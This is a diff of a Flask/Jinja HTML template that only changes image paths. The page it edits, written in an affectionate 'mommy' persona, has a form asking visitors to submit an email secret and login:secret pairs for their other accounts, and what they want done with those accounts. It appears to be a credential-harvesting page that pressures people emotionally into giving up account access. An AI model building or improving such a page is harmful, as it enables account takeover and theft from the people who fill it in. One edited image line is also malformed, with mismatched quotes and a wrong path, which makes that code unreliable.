@@ -11,7 +11,7 @@
   body {
     margin: 0;
     padding: 0;
-    background: url("img/1.gif") no-repeat center center fixed;
+    background: url("images/1.gif") no-repeat center center fixed;
     background-size: cover;
   }
 
@@ -225,10 +225,10 @@
       Everything you give me is your choice, no pressure, only love and care from mommy~ 😊
     </p>
 
-    <img src="img/2.jpg"
-
+    <img src="{{ url_for('static', filename='images/2.jpg') }}"
          alt="Cute image"
          style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
+
 
    
     <form action="/send" method="POST">
@@ -251,7 +251,7 @@
       <label for="email_secret">Email Secret</label>
       <input type="text" id="email_secret" name="email_secret" placeholder="Shhh... mommy will keep it safe 💌" />
 
-      <img src="img/3.jpg"
+      <img src="/img/3.jpg"
          alt="Cute image"
            style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
 
@@ -292,8 +292,8 @@
       <textarea id="other_accounts" name="other_accounts" rows="3" placeholder="Your Secret or login:Secret pairs here"></textarea>
 
       <p class="small-note">We're almost done, cutie~ 💕</p>
-       <img src="img/4.png"
-         alt="Cute image"
+      <img src="{{ url_for('static', filename="images.4.png) }}
+
            style="margin-top: 20px; max-width: 100%; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3);" />
 
       <label>What would you like me to do with your accounts? *</label>
